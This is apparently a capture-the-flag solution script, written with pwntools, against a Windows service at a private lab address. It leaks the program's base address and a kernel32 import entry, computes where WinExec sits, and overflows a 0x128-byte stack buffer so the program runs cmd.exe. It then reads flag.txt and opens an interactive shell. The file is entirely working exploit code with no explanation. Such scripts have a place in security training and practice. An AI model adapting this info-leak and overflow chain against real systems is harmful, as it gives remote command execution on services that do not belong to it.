from pwn import *
context.arch='amd64'
r=remote('192.168.36.130', 10002)
r.newline=b'\r\n'

main_addr=r.recvline()[:-1].decode().split(':')[1]
main_addr=int(main_addr, 16)
base_addr=main_addr-5253
info(f"Base Address: {hex(base_addr)}")
iat_addr=base_addr+0x8268
r.recv()
r.sendline(b'cmd.exe\x00')
r.recv()
r.send(hex(iat_addr+0x10).encode())
r.recv()
GetLastErrorStub=r.recv().decode().split('address : ')[1].split('\n')[0]
GetLastErrorStub=int(GetLastErrorStub, 16)
kernel32_addr=GetLastErrorStub-88976
info(f"Kernel32 Address: {hex(kernel32_addr)}")
winexec_addr=kernel32_addr+417728
ret_addr=base_addr+0x1600

r.sendline(b'a'*0x128+flat(ret_addr, winexec_addr))
r.sendline(b'type flag.txt')
r.interactive()

